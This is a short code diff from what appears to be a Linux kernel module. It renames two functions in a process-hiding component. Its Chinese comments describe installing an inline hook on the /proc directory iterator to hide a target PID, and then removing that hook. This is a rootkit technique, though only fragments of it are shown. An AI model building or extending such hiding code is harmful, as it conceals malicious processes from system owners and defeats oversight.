@@ -55,7 +55,7 @@ static void proc_iterate_hook_work(struct file *file, struct dir_context *ctx)
 }
 
 // 安装hook,隐藏目标pid
-static int hide_process(pid_t pid)
+static int hide_process_install(pid_t pid)
 {
     struct file_operations *fops;
     unsigned long iterate_addr;
@@ -108,7 +108,7 @@ out_unlock:
 }
 
 // 卸载hook
-static void hide_process_cleanup(void)
+static void hide_process_remove(void)
 {
     mutex_lock(&g_hide_process_lock);
     inline_hook_remove(g_proc_iterate_hook);
